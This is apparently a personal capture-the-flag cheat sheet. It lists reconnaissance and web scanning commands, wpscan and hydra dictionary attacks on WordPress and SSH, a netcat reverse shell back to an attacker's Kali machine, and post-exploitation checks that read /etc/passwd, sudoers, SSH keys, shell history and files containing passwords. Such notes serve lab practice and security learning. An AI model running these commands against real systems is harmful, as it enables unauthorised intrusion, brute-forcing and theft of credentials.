Inspired by https://github.com/DCAU7/ctf-template/blob/master/ctf-template.txt

# Enumeration
--- 

### An active/passive arp scanner with a number of different options.
`netdiscover`



### I used to use nmap to determine the IP but now just use netdiscover instead.
`nmap -sT 192.168.0.0/24`




### Nmap TCP connect scan (-sT) that also enables OS detection, version detection, script scanning and traceroute (-A)
`nmap -sT -A <IP Address>`





### Nmap TCP connect scan (-sT) that scans all ports (-p-). A regular scan only scans the 1000 most common ports, 
### so this should identify any non-standard ports as well.
`nmap -sT -p- <IP Address>`





### A web server scanner that can perform a number of tests. Can sometimes reveal interesting things.
`nikto -h http://<IP Address>`




### A web content scanner. Can be helpful in finding hidden files or directories on a web server.
`dirb http://<IP Address> -w /usr/share/dirb/wordlists/common.txt`




### A web content scanner. Can be helpful in finding hidden files or directories on a web server.
`gobuster dir -u http://<IP Address>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`




### dirsearch is another web content scanner, but isn't installed on Kali Linux, but it's a great tool (better than dirb in my opinion, 
### so installed it from GitHub).
`./dirsearch.py -e php,html,txt,zip,gz,tgz,tar,bzip2,bak,log,pcap -u http://<IP Address>`




`./dirsearch.py -e php,html,txt,zip,gz,tgz,tar,bzip2,bak,log,pcap -rR1 -u http://<IP Address>`




`./dirsearch.py -e php,html,txt,zip,gz,tgz,tar,bzip2,bak,log,pcap -rR1 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -u http://<IP Address>`




### This doesn't always exist, but if it does, it can be a good source of information
`http://<IP Address>/robots.txt`




### WordPress scanner User Enumeration
`wpscan --url http://<IP Address> -e u1-10 --no-banner --no-update`




### WordPress scanner Plugin Enumeration
`wpscan --url http://<IP Address> -e p --no-banner --no-update`




### WordPress scanner Template Enumeration
`wpscan --url http://<IP Address> -e t --no-banner --no-update`




### WordPress scanner - this does a dictionary attack - just need to add a username or usernames list (change to -u for username list)
### The --wp-content wp-content argument is only required if there are problems with the scan
`wpscan --url http://<IP Address> -U <<<<  username  >>>> -P '/usr/share/wordlists/rockyou.txt' --wp-content-dir wp-content --no-banner --no-update`




### Only useful for Samba Shares etc etc.  You may need to add parameters as required
`enum4linux <IP Address>`




### Good for dictionary attacking SSH (if needed)
`hydra -f -V -t 4 -l youer_user_name -P '/usr/share/wordlists/rockyou.txt' ssh://<IP Address> -I`




# ADDITIONAL NOTES:



	Reverse Shells

---


### On Kali Linux - start netcat listening on port 5555

nc -nlvp 5555



### Ideally, you want to be able to create a reverse shell to connect back to your Kali Linux computer from the remote server

nc -e /bin/sh <IP Address of Kali> 5555









	Post Enumeration - these are things to look for to help with privilege escalation.


### Improving the quality of the shell
python -c 'import pty;pty.spawn("/bin/bash")'

### If python isn't installed, try Python3
python3 -c 'import pty;pty.spawn("/bin/bash")'



### Handy for an automated check for most of the below, but obviously only works if python is installed.
http://www.securitysift.com/download/linuxprivchecker.py




### LinEnum script - https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh




### A python script that searches for different SUID files and alerts you to them
https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py




### Check /etc/passwd - handy for usernames
cat /etc/passwd






### Checks for SUID files that may be able to be exploited (I recommend getting used to the normal SUID files on 
### a system so you can spot the unusual ones)
`find / -perm -u=s -type f 2>/dev/null`






### Checks the /etc/passwd file to see if there is anyone else with root privileges
grep -v -E "^#" /etc/passwd | awk -F: '$3== 0 {print $1}'






### Checks processes - use ps aux w for a fuller view
ps aux






### Checks processes
ps -ef






### Lists the sudo privileges for the user you are in the system as
sudo -l






### Try and read the /etc/sudoers file - this rarely works unless you have appropriate permissions
cat /etc/sudoers






### Checks cron folders
ls -la /etc/cron*






### Run this command in the /etc/ folder - lots of false positives, but you never know
find . -type f -maxdepth 4 | xargs grep -i "password"






### Checks your home folder for SSH files
ls -la ~/.ssh/






### Check history of typed commands (I suggest using both methods)
cat ~/.bash_history






### Check history of typed commands (I suggest using both methods)
history





